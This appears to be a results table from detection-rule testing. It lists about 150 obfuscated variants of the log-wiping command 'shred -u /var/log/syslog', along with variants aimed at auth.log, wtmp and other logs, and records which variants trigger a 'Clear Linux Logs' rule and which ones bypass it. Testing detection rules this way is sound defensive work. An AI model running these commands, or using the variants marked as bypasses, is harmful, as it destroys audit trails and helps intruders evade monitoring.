@@ -1,0 +1,219 @@
+ID,Command,Log File,Result,All Detected Rules
+1,"shred -u /var/""log""/syslog",Clear_Linux_Logs_attack1.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+2,"shred -u /""var""/log/syslog",Clear_Linux_Logs_attack2.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+3,"shred -u ""/var""/log/syslog",Clear_Linux_Logs_attack3.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+4,"shred -u /var/log/""syslog""",Clear_Linux_Logs_attack4.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+5,"shred -u /var/log/sys""log""",Clear_Linux_Logs_attack5.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+6,"shred -u /va""r""/log/syslog",Clear_Linux_Logs_attack6.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+7,"shred -u /var/lo""g""/syslog",Clear_Linux_Logs_attack7.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+8,"sh""red"" -u /var/log/syslog",Clear_Linux_Logs_attack8.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+9,"""shred"" -u /var/log/syslog",Clear_Linux_Logs_attack9.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+10,"/usr/bin/""shred"" -u /var/log/syslog",Clear_Linux_Logs_attack10.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+11,"/usr/bin/sh""red"" -u /var/log/syslog",Clear_Linux_Logs_attack11.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+12,sh$'red' -u /var/log/syslog,Clear_Linux_Logs_attack12.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
+13,"shre""d"" -u /var/log/syslog",Clear_Linux_Logs_attack13.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+14,shre\u0064 -u /var/log/syslog,Clear_Linux_Logs_attack14.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
+15,sh\u0072ed -u /var/log/syslog,Clear_Linux_Logs_attack15.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
+17,shred -u /var/log/sys\u006cog,Clear_Linux_Logs_attack17.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+18,shred -u /var/log/sy\u0073log,Clear_Linux_Logs_attack18.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+19,"shred -u /var/log/sy""sl""og",Clear_Linux_Logs_attack19.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+20,"shred -u /var/l""og""/syslog",Clear_Linux_Logs_attack20.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+21,"shred -u /v""ar""/log/syslog",Clear_Linux_Logs_attack21.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+22,"/bin/shred -u /var/""log""/syslog",Clear_Linux_Logs_attack22.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+23,"/bin/""shred"" -u /var/log/syslog",Clear_Linux_Logs_attack23.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+24,"sh""re""""d"" -u /var/log/syslog",Clear_Linux_Logs_attack24.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+25,"s""hr""ed -u /var/log/syslog",Clear_Linux_Logs_attack25.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+26,"shre""d"" -u ""/var/log/syslog""",Clear_Linux_Logs_attack26.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+27,shred -u /var/log/syslog#,Clear_Linux_Logs_attack27.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+28,shred -u /var/log/syslog\,Clear_Linux_Logs_attack28.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+29,"shred -u ""/var""/""log""/""syslog""",Clear_Linux_Logs_attack29.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+30,sh$'\x72'$'ed' -u /var/log/syslog,Clear_Linux_Logs_attack30.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
+31,"sh""""red -u /var/log/syslog",Clear_Linux_Logs_attack31.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+32,"sh""+""red -u /var/log/syslog",Clear_Linux_Logs_attack32.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
+33,"shred -u /var/lo""""g/syslog",Clear_Linux_Logs_attack33.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+34,"shred -u /va""""r/log/syslog",Clear_Linux_Logs_attack34.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+35,"shred -u /var/log/sy""""slog",Clear_Linux_Logs_attack35.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+36,"shred -u /var/log/sys""+""log",Clear_Linux_Logs_attack36.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+37,"shred -u ""/var""/""log""/""syslog""",Clear_Linux_Logs_attack37.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+38,"/usr/""bin""/shred -u /var/log/syslog",Clear_Linux_Logs_attack38.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+39,"/usr/bin/shred -u ""/var/log""/syslog",Clear_Linux_Logs_attack39.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+40,"/usr/bin/shred -u /var/log/""sys""""log""",Clear_Linux_Logs_attack40.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+42,shred -u /var/log/s$'yslog',Clear_Linux_Logs_attack42.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+43,shred -u /var/log/$'syslog',Clear_Linux_Logs_attack43.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+44,"sh$'red' -u ""$""/var/log/syslog",Clear_Linux_Logs_attack44.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
+45,sh$'r''ed' -u /var/log/syslog,Clear_Linux_Logs_attack45.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
+46,"/usr/bin/s""hr""""ed"" -u /var/log/syslog",Clear_Linux_Logs_attack46.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+47,"/usr/bin/shre""d"" -u /va""r""/log/syslog",Clear_Linux_Logs_attack47.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+51,"shre\u0064 -u ""/var/log/syslog""",Clear_Linux_Logs_attack51.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
+52,"""sh""""red"" -u /var/log/syslog",Clear_Linux_Logs_attack52.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+53,"s""hr""""ed"" -u /var/log/syslog",Clear_Linux_Logs_attack53.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+55,"sh""""r""""ed"" -u /var/log/syslog",Clear_Linux_Logs_attack55.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
+56,"shred -u /""var""/""log""/sys""log""",Clear_Linux_Logs_attack56.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+58,"sh""+""re""+""d"" -u /var/log/syslog",Clear_Linux_Logs_attack58.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
+59,"shred -u ""/var""/log/""syslog""",Clear_Linux_Logs_attack59.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+60,s$'h'$'red' -u /var/log/syslog,Clear_Linux_Logs_attack60.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
+61,shred --remove /var/log/syslog,Clear_Linux_Logs_attack61.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+62,shred --remove=yes /var/log/syslog,Clear_Linux_Logs_attack62.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+63,shred -u --verbose /var/log/syslog,Clear_Linux_Logs_attack63.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+64,shred --remove --verbose /var/log/syslog,Clear_Linux_Logs_attack64.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+65,shred --force --remove /var/log/syslog,Clear_Linux_Logs_attack65.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+66,shred -u /var/log/messages,Clear_Linux_Logs_attack66.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+67,shred -u /var/log/kern.log,Clear_Linux_Logs_attack67.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+68,shred -u /var/log/auth.log,Clear_Linux_Logs_attack68.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+69,shred --remove /var/log/auth.log,Clear_Linux_Logs_attack69.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+70,shred -f --remove /var/log/syslog,Clear_Linux_Logs_attack70.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+71,shred --force --remove=yes /var/log/syslog,Clear_Linux_Logs_attack71.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+72,shred -u --force /var/log/syslog,Clear_Linux_Logs_attack72.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+73,shred -u -v /var/log/syslog,Clear_Linux_Logs_attack73.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+74,shred --remove --zero /var/log/syslog,Clear_Linux_Logs_attack74.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+75,shred --iterations=3 --remove /var/log/syslog,Clear_Linux_Logs_attack75.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+76,shred -n 5 --remove /var/log/syslog,Clear_Linux_Logs_attack76.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+77,shred --remove --random-source=/dev/urandom /var/log/syslog,Clear_Linux_Logs_attack77.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+78,shred --remove=yes --zero /var/log/syslog,Clear_Linux_Logs_attack78.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+79,shred -f -u /var/log/syslog,Clear_Linux_Logs_attack79.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+80,shred --remove --force /var/log/syslog,Clear_Linux_Logs_attack80.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+81,shred --remove /var/log/wtmp,Clear_Linux_Logs_attack81.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+82,shred --remove /var/log/btmp,Clear_Linux_Logs_attack82.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+83,shred --remove /var/log/lastlog,Clear_Linux_Logs_attack83.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+84,shred --remove /var/log/faillog,Clear_Linux_Logs_attack84.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+85,shred --remove /var/log/dmesg,Clear_Linux_Logs_attack85.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+86,shred --remove /var/log/debug,Clear_Linux_Logs_attack86.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+87,shred -u --remove /var/log/syslog,Clear_Linux_Logs_attack87.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+88,shred -u --remove=yes /var/log/syslog,Clear_Linux_Logs_attack88.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+89,shred --remove /var/log/syslog.1,Clear_Linux_Logs_attack89.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+90,shred -f --remove /var/log/syslog.1,Clear_Linux_Logs_attack90.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+91,shred --remove=wipe /var/log/syslog,Clear_Linux_Logs_attack91.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+92,shred --remove=shred /var/log/syslog,Clear_Linux_Logs_attack92.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+93,shred --remove=unlink /var/log/syslog,Clear_Linux_Logs_attack93.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+94,shred --rm /var/log/syslog,Clear_Linux_Logs_attack94.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+95,shred --delete /var/log/syslog,Clear_Linux_Logs_attack95.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+96,shred --erase /var/log/syslog,Clear_Linux_Logs_attack96.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+97,shred --obliterate /var/log/syslog,Clear_Linux_Logs_attack97.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+98,shred --destroy /var/log/syslog,Clear_Linux_Logs_attack98.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+99,shred --wipe /var/log/syslog,Clear_Linux_Logs_attack99.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+100,shred --purge /var/log/syslog,Clear_Linux_Logs_attack100.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+101,shred --nuke /var/log/syslog,Clear_Linux_Logs_attack101.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+102,shred --trash /var/log/syslog,Clear_Linux_Logs_attack102.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+103,shred -u /var/log/boot.log,Clear_Linux_Logs_attack103.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+104,shred --remove /var/log/boot.log,Clear_Linux_Logs_attack104.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+105,shred --remove --quiet /var/log/syslog,Clear_Linux_Logs_attack105.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+106,shred -u --iterations=1 /var/log/syslog,Clear_Linux_Logs_attack106.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+107,shred --remove --iterations=2 /var/log/syslog,Clear_Linux_Logs_attack107.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+108,shred --rm -v /var/log/syslog,Clear_Linux_Logs_attack108.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+109,shred --rm --iterations=3 /var/log/syslog,Clear_Linux_Logs_attack109.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+110,shred -f --rm /var/log/syslog,Clear_Linux_Logs_attack110.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+111,shred --delete --force /var/log/syslog,Clear_Linux_Logs_attack111.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+112,shred --remove /var/log/apt/history.log,Clear_Linux_Logs_attack112.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+113,shred --remove /var/log/installer/syslog,Clear_Linux_Logs_attack113.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+114,shred --remove /var/log/installer/debug,Clear_Linux_Logs_attack114.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+115,shred --remove /var/log/cloud-init.log,Clear_Linux_Logs_attack115.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+116,shred --remove /var/log/cloud-init-output.log,Clear_Linux_Logs_attack116.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+117,shred --remove /var/log/unattended-upgrades/unattended-upgrades.log,Clear_Linux_Logs_attack117.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+118,shred -u /var/log/alternatives.log,Clear_Linux_Logs_attack118.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+119,shred -u /var/log/user.log,Clear_Linux_Logs_attack119.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+120,shred --remove /var/log/user.log,Clear_Linux_Logs_attack120.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+121,shred -u /var/log/syslo,Clear_Linux_Logs_attack121.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+122,shred -u /var/log/sylog,Clear_Linux_Logs_attack122.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+123,shred -u /var/log/ysylog,Clear_Linux_Logs_attack123.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+124,shred -u /var/log/syslogg,Clear_Linux_Logs_attack124.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+125,shred -u /var/log/slog,Clear_Linux_Logs_attack125.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+126,shred -u /var/log/sylogg,Clear_Linux_Logs_attack126.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+127,shred -u /var/log/sysloog,Clear_Linux_Logs_attack127.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+128,shred -u /var/log/syslg,Clear_Linux_Logs_attack128.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+129,shred -u /var/log/ssylog,Clear_Linux_Logs_attack129.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+130,shred -u /var/log/sylogl,Clear_Linux_Logs_attack130.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+131,shred -u /var/log/sysog,Clear_Linux_Logs_attack131.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+132,shred -u /var/log/syslo,Clear_Linux_Logs_attack132.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+135,shred -u /var/log/sylog/,Clear_Linux_Logs_attack135.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+136,shred -u /var/log/syslog.,Clear_Linux_Logs_attack136.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+137,shred -u /var/log/syslo/,Clear_Linux_Logs_attack137.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+141,shred -u /var/log//syslog,Clear_Linux_Logs_attack141.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+142,shred -u /var/log/syslo.log,Clear_Linux_Logs_attack142.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+143,shred -u /var/log/sylogg/,Clear_Linux_Logs_attack143.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+144,shred -u /var/log/syslog1,Clear_Linux_Logs_attack144.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+145,shred -u /var/log/syslogg.,Clear_Linux_Logs_attack145.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+146,shred -u /var/log/syslo1,Clear_Linux_Logs_attack146.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+148,shred -u /var/log/sysl,Clear_Linux_Logs_attack148.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+151,shred -u /var/log/yslog,Clear_Linux_Logs_attack151.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+154,shred -u /var/log/sysog,Clear_Linux_Logs_attack154.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+155,shred -u /var/log/yslogg,Clear_Linux_Logs_attack155.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+157,shred -u /var/log/sylog.,Clear_Linux_Logs_attack157.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+160,shred -u /var/log/sylog/,Clear_Linux_Logs_attack160.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+161,shred -u /var/log/sylogg.,Clear_Linux_Logs_attack161.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+162,shred -u /var/log/sylog1,Clear_Linux_Logs_attack162.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+164,shred -u /var/log/sysl0g,Clear_Linux_Logs_attack164.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+166,shred -u /var/log/sylog2,Clear_Linux_Logs_attack166.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+167,shred -u /var/log/sys1og,Clear_Linux_Logs_attack167.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+169,shred -u /var/log/syslo_,Clear_Linux_Logs_attack169.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+171,shred -u /var/log/sys1g,Clear_Linux_Logs_attack171.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+174,shred -u /var/log/slogg,Clear_Linux_Logs_attack174.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+175,shred -u /var/log/sys1log,Clear_Linux_Logs_attack175.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+178,shred -u /var/log/sy1log,Clear_Linux_Logs_attack178.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+181,shred /var/log/syslog -u,Clear_Linux_Logs_attack181.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+186,shred /var/log/syslog --remove,Clear_Linux_Logs_attack186.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+187,shred --remove /var/log/syslog,Clear_Linux_Logs_attack187.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+191,shred --remove=unlink /var/log/syslog,Clear_Linux_Logs_attack191.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+193,shred /var/log/syslog --force --remove,Clear_Linux_Logs_attack193.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+196,shred -u --force /var/log/syslog,Clear_Linux_Logs_attack196.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+199,shred /var/log/syslog -u --verbose,Clear_Linux_Logs_attack199.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+200,shred --verbose /var/log/syslog -u,Clear_Linux_Logs_attack200.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+202,shred -u /var/log/syslog --force,Clear_Linux_Logs_attack202.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+206,shred --force --remove /var/log/syslog,Clear_Linux_Logs_attack206.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+208,shred -u --remove=wipe /var/log/syslog,Clear_Linux_Logs_attack208.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+214,shred --remove --force -u /var/log/syslog,Clear_Linux_Logs_attack214.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+218,shred -u --remove=unlink --verbose /var/log/syslog,Clear_Linux_Logs_attack218.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+221,shred --remove --verbose /var/log/syslog -u,Clear_Linux_Logs_attack221.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+225,shred --remove=wipe -u /var/log/syslog,Clear_Linux_Logs_attack225.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+227,shred /var/log/syslog --verbose --remove,Clear_Linux_Logs_attack227.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+229,shred /var/log/syslog --force -u,Clear_Linux_Logs_attack229.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+231,shred --remove /var/log/syslog -u,Clear_Linux_Logs_attack231.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+235,shred --remove=wipe --force /var/log/syslog -u,Clear_Linux_Logs_attack235.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
+241,shred -u /var/log/017163,Clear_Linux_Logs_attack241.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
